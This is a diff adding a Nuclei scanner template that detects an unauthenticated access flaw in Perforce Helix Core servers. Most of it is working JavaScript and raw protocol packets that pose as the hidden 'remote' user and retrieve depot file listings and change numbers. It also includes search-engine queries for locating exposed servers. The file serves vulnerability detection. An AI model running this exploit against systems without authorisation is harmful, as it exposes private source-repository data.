@@ -1,0 +1,297 @@
+id: perforce-remote-depot-unauth
+
+info:
+  name: Perforce Server - Unauthenticated Remote Depot Access
+  author: Morgan Robertson
+  severity: high
+  description: |
+    Detected Perforce server allowed unauthenticated remote depot access via the hidden built-in "remote" user. This affected server versions below 2025.1 when the security level was below 4 (default is 0). The depot file listing and change list numbers were retrieved without authentication using the rmt-DbPipe RPC against the db.rev table.
+  reference:
+    - https://morganrobertson.net/p4wned/
+    - https://www.keysight.com/blogs/en/tech/nwvs/2022/06/08/a-sneak-peek-into-the-protocol-behind-perforce
+    - https://help.perforce.com/helix-core/release-notes/current/relnotes.txt
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-306
+    cpe: cpe:2.3:a:perforce:helix_core:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: perforce
+    product: helix_core
+    shodan-query: port:1666 "P4D"
+    fofa-query: port="1666" && protocol="unknown"
+  tags: perforce,helixcore,scm,unauth,rpc,info-disclosure
+
+flow: tcp(1) && javascript(1)
+
+tcp:
+  - host:
+      - "{{Host}}:1666"
+    inputs:
+      - type: hex
+        data: "efef000000636d7066696c65000000000000616c7453796e63000000000000636c69656e7400020000003937006170690005000000393939393900656e61626c6553747265616d73000000000000656e61626c654772617068000000000000657870616e64416e646d6170730000000000006368756e6b696e67000000000000686f737400090000006c6f63616c686f737400706f727400120000003139322e3136382e302e3130313a3136363600736e646275660007000000313936393931390072637662756600050000003938333034006175746f54756e650001000000310066756e63000800000070726f746f636f6c00eded00000076657273696f6e001c000000323032342e322f4c494e555832365838365f36342f32363937383232006175746f4c6f67696e00000000000070726f670002000000703400636c69656e7400090000006c6f63616c686f73740063776400040000002f746d7000686f737400090000006c6f63616c686f7374006f730004000000554e4958006c6f63616c65000100000043007573657200040000007573657200756e69636f6465000000000000636861727365740001000000310075746638626f6d00010000003100636c69656e74436173650001000000300066756e630009000000757365722d696e666f00"
+    read-size: 4096
+    matchers:
+      - type: word
+        part: data
+        encoding: hex
+        words:
+          - "xfiles"
+          - "server"
+        condition: and
+        internal: true
+
+javascript:
+  - code: |
+      var net = require("nuclei/net");
+
+      function strToHex(str) {
+          var hex = "";
+          for (var i = 0; i < str.length; i++) {
+              var h = str.charCodeAt(i).toString(16);
+              if (h.length < 2) h = "0" + h;
+              hex += h;
+          }
+          return hex;
+      }
+
+      function numToHexLE(num) {
+          var b1 = (num & 0xFF), b2 = ((num >> 8) & 0xFF), b3 = ((num >> 16) & 0xFF), b4 = ((num >> 24) & 0xFF);
+          return [b1, b2, b3, b4].map(function(b) {
+              var s = b.toString(16);
+              return (s.length < 2 ? "0" + s : s);
+          }).join("");
+      }
+
+      function packParamHex(name, value) {
+          return strToHex(name) + "00" + numToHexLE(value.length) + strToHex(value) + "00";
+      }
+
+      function packParamHexFromHex(name, valueHex) {
+          var len = valueHex.length / 2;
+          return strToHex(name) + "00" + numToHexLE(len) + valueHex + "00";
+      }
+
+      function buildPacketHex(params) {
+          var payloadHex = "";
+          for (var i = 0; i < params.length; i++) {
+              var p = params[i];
+              if (p.length === 3 && p[2] === true) {
+                   payloadHex += packParamHexFromHex(p[0], p[1]);
+              } else {
+                   payloadHex += packParamHex(p[0], p[1]);
+              }
+          }
+          var totalLen = payloadHex.length / 2;
+          var lenLow = totalLen & 0xFF;
+          var lenHigh = (totalLen >> 8) & 0xFF;
+          var xor = lenLow ^ lenHigh;
+          var headerHex = [xor, lenLow, lenHigh, 0, 0].map(function(b) {
+              var s = b.toString(16); return (s.length < 2 ? "0" + s : s);
+          }).join("");
+          return headerHex + payloadHex;
+      }
+
+      function parsePerforceResponse(dataStr) {
+          var offset = 0;
+          var results = [];
+          while (offset < dataStr.length) {
+              if (offset + 5 > dataStr.length) break;
+              var lenLow = dataStr.charCodeAt(offset + 1);
+              var lenHigh = dataStr.charCodeAt(offset + 2);
+              var bodyLen = lenLow | (lenHigh << 8);
+              var totalPacketSize = 5 + bodyLen;
+              if (offset + totalPacketSize > dataStr.length) break;
+
+              var body = dataStr.substring(offset + 5, offset + totalPacketSize);
+              var packetObj = {};
+              var bodyOffset = 0;
+
+              while (bodyOffset < body.length) {
+                  var nameEnd = body.indexOf('\u0000', bodyOffset);
+                  if (nameEnd === -1) break;
+                  var key = body.substring(bodyOffset, nameEnd);
+                  bodyOffset = nameEnd + 1;
+
+                  if (bodyOffset + 4 > body.length) break;
+                  var v0 = body.charCodeAt(bodyOffset);
+                  var v1 = body.charCodeAt(bodyOffset + 1);
+                  var v2 = body.charCodeAt(bodyOffset + 2);
+                  var v3 = body.charCodeAt(bodyOffset + 3);
+                  var valLen = (v0 | (v1 << 8) | (v2 << 16) | (v3 << 24)) >>> 0;
+                  bodyOffset += 4;
+
+                  if (bodyOffset + valLen > body.length) break;
+                  var value = body.substring(bodyOffset, bodyOffset + valLen);
+                  packetObj[key] = value;
+                  bodyOffset += valLen + 1;
+              }
+              results.push(packetObj);
+              offset += totalPacketSize;
+          }
+          return results;
+      }
+
+      function decodeDbRev(bufferStr) {
+          var offset = 0;
+          var records = [];
+
+          function readUInt32() {
+              if (offset + 4 > bufferStr.length) return -1;
+              var v = bufferStr.charCodeAt(offset) |
+                      (bufferStr.charCodeAt(offset+1) << 8) |
+                      (bufferStr.charCodeAt(offset+2) << 16) |
+                      (bufferStr.charCodeAt(offset+3) << 24);
+              offset += 4;
+              return v >>> 0;
+          }
+
+          function readString() {
+              var len = readUInt32();
+              if (len === -1 || offset + len > bufferStr.length) return null;
+              var s = bufferStr.substring(offset, offset + len);
+              offset += len;
+              return s;
+          }
+
+          while (offset < bufferStr.length) {
+              var depotFile = readString();
+              if (depotFile === null) break;
+
+              var rev = readUInt32();
+              var type = readUInt32();
+              var action = readUInt32();
+              var change = readUInt32();
+              var date = readUInt32();
+              var modTime = readUInt32();
+
+              if (offset + 32 > bufferStr.length) break;
+              offset += 32;
+
+              var lazyFile = readString();
+              var revStr = readString();
+              var typeStr = readString();
+
+              records.push({
+                  "depotFile": depotFile,
+                  "rev": rev,
+                  "change": change,
+                  "action": action,
+                  "date": new Date(date * 1000).toISOString().split('T')[0]
+              });
+          }
+          return records;
+      }
+
+      function accessRemote(host, port, useUnicode) {
+          var address = host + ":" + port;
+
+          var keyValHex = "02000000" + "2f2f" + "ffffff7f";
+          for (var k = 0; k < 32; k++) keyValHex += "00";
+
+          var p1 = [
+              ["serverID", ""],
+              ["cmdIdent", "4139E823 20EDF233 3D743292 62DFA422"],
+              ["client", "97"],
+              ["sndbuf", "1969919"],
+              ["rcvbuf", "98304"],
+              ["autoTune", "1"],
+              ["func", "protocol"]
+          ];
+
+          var p2 = [
+              ["keyVal", keyValHex, true],
+              ["os", "UNIX"],
+              ["cwd", ""],
+              ["client", ""],
+              ["table", "db.rev"],
+              ["confirm", "dmr-DbPipe"],
+              ["version", "10"],
+              ["remoteRange", "1"],
+              ["remoteMap0", "//..."],
+              ["user", "remote"]
+          ];
+
+          if (useUnicode) {
+              p2.push(["unicode", ""]);
+          }
+
+          p2.push(["func", "rmt-DbPipe"]);
+
+          var p3 = [["func", "release"]];
+
+          var payloadHex = buildPacketHex(p1) + buildPacketHex(p2);
+          var releaseHex = buildPacketHex(p3);
+          var rawBuffer = "";
+
+          try {
+              var conn = net.Open("tcp", address);
+              conn.SendHex(payloadHex);
+              conn.SetTimeout(5);
+
+              for (var loop = 0; loop < 20; loop++) {
+                  try {
+                      var bytes = conn.Recv(4096);
+                      if (bytes && bytes.length > 0) {
+                          for (var i = 0; i < bytes.length; i++) {
+                              rawBuffer += String.fromCharCode(bytes[i]);
+                          }
+                          if (rawBuffer.indexOf('func\u0000\u0007\u0000\u0000\u0000release\u0000') !== -1) {
+                              break;
+                          }
+                      } else {
+                          break;
+                      }
+                  } catch (e) { break; }
+              }
+              try { conn.SendHex(releaseHex); } catch(e) {}
+              conn.Close();
+          } catch (e) { return []; }
+
+          var packets = parsePerforceResponse(rawBuffer);
+          var extractedFiles = [];
+
+          for (var i = 0; i < packets.length; i++) {
+              var pkt = packets[i];
+              if (pkt['func'] === 'dmr-DbPipe' && pkt['data']) {
+                  var records = decodeDbRev(pkt['data']);
+                  for (var r = 0; r < records.length; r++) {
+                      extractedFiles.push(records[r]);
+                  }
+              }
+          }
+          return extractedFiles;
+      }
+
+      var files = accessRemote(Host, Port, false);
+
+      if (files.length === 0) {
+          files = accessRemote(Host, Port, true);
+      }
+
+      JSON.stringify(files);
+
+    args:
+      Host: "{{Host}}"
+      Port: "1666"
+
+    matchers:
+      - type: word
+        words:
+          - '"depotFile":'
+          - '"change":'
+        condition: and
+
+    extractors:
+      - type: json
+        name: depot_files
+        json:
+          - '.[].depotFile'
+
+      - type: json
+        name: changes
+        json:
+          - '.[].change'
+# digest: 4b0a00483046022100beb0e94d80cf8fa7e3d1a2114d7f14ff3eba183f5adde97d1591695f641842fd022100f1a98751e7f8449887b0a308d2dc99cf0ad873a5119ae1b4eb7def4040982fe1:922c64590222798bb761d5b6d8e72950
